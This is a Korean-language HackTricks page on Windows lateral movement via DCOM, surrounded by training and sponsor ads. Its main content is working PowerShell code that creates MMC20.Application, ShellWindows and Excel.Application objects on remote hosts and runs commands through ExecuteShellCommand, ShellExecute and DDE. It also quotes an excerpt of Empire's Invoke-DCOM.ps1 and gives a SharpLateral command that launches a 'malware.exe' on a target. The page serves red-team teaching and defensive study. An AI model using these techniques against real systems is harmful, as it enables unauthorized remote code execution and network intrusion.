# DCOM Exec

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정하세요. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**이 기술에 대한 자세한 정보는 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)의 원본 게시물을 확인하세요.**

분산 구성 요소 개체 모델(Distributed Component Object Model, DCOM)은 네트워크 기반 개체와의 상호 작용에 대한 흥미로운 기능을 제공합니다. Microsoft는 DCOM 및 구성 요소 개체 모델(Component Object Model, COM)에 대한 포괄적인 문서를 제공하고 있으며, [DCOM에 대한 문서](https://msdn.microsoft.com/en-us/library/cc226801.aspx)와 [COM에 대한 문서](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)에서 확인할 수 있습니다. PowerShell 명령을 사용하여 DCOM 응용 프로그램 목록을 검색할 수 있습니다:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM 객체인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)은 MMC 스냅인 작업에 대한 스크립팅을 가능하게 합니다. 특히, 이 객체는 `Document.ActiveView` 아래에 `ExecuteShellCommand` 메서드를 포함하고 있습니다. 이 메서드에 대한 자세한 정보는 [여기](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)에서 확인할 수 있습니다. 다음을 실행하여 확인해보세요:

이 기능은 DCOM 응용 프로그램을 통해 네트워크 상에서 명령을 실행하는 것을 용이하게 합니다. 관리자로서 원격으로 DCOM과 상호 작용하기 위해 PowerShell을 다음과 같이 사용할 수 있습니다:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
이 명령은 DCOM 애플리케이션에 연결하고 COM 객체의 인스턴스를 반환합니다. 그런 다음 ExecuteShellCommand 메서드를 호출하여 원격 호스트에서 프로세스를 실행할 수 있습니다. 이 프로세스는 다음 단계를 포함합니다:

메서드 확인:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE 얻기:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**이 기술에 대한 자세한 내용은 원본 게시물 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)을 확인하세요.**

**MMC20.Application** 객체는 명시적인 "LaunchPermissions"이 없어서 관리자가 액세스할 수 있는 권한으로 기본 설정되었습니다. 자세한 내용은 [여기](https://twitter.com/tiraniddo/status/817532039771525120)에서 확인할 수 있으며, [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET을 사용하여 명시적인 Launch Permission이 없는 객체를 필터링하는 것이 권장됩니다.

`ShellBrowserWindow` 및 `ShellWindows`라는 두 개의 특정 객체는 명시적인 Launch Permissions이 없어서 강조되었습니다. `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` 레지스트리 항목이 없으면 명시적인 권한이 없음을 의미합니다.

###  ShellWindows
`ShellWindows`의 경우 ProgID가 없으므로 .NET 메서드 `Type.GetTypeFromCLSID` 및 `Activator.CreateInstance`을 사용하여 AppID를 통해 객체 인스턴스화를 용이하게 할 수 있습니다. 이 프로세스는 OleView .NET을 활용하여 `ShellWindows`의 CLSID를 검색합니다. 인스턴스화된 후에는 `WindowsShell.Item` 메서드를 통해 상호 작용이 가능하며, `Document.Application.ShellExecute`와 같은 메서드 호출로 이어집니다.

원격으로 객체를 인스턴스화하고 명령을 실행하는 PowerShell 예제 명령이 제공되었습니다:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Excel DCOM 객체를 이용한 측면 이동

DCOM Excel 객체를 악용하여 측면 이동을 수행할 수 있습니다. 자세한 정보는 [Cybereason의 블로그](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)에서 DCOM을 통한 Excel DDE를 이용한 측면 이동에 대한 논의를 읽는 것이 좋습니다.

Empire 프로젝트는 PowerShell 스크립트를 제공하며, 이 스크립트는 DCOM 객체를 조작하여 Excel을 통한 원격 코드 실행(RCE)을 보여줍니다. 아래는 [Empire의 GitHub 저장소](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)에서 사용 가능한 스크립트 일부로, Excel을 RCE에 악용하는 다양한 방법을 보여줍니다:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### 측면 이동을 자동화하는 도구

이러한 기술을 자동화하기 위해 두 가지 도구가 강조되었습니다:

- **Invoke-DCOM.ps1**: Empire 프로젝트에서 제공하는 PowerShell 스크립트로, 원격 컴퓨터에서 코드를 실행하기 위한 다양한 방법을 간편하게 호출할 수 있습니다. 이 스크립트는 Empire GitHub 저장소에서 사용할 수 있습니다.

- **SharpLateral**: 원격으로 코드를 실행하기 위해 설계된 도구로, 다음 명령을 사용하여 실행할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 자동 도구

* Powershell 스크립트 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)은 다른 기기에서 코드를 실행하는 주석 처리된 방법을 쉽게 호출할 수 있게 해줍니다.
* 또한 [**SharpLateral**](https://github.com/mertdas/SharpLateral)을 사용할 수도 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 참고 자료

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 표면을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>와 함께 AWS 해킹을 처음부터 전문가까지 배워보세요</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
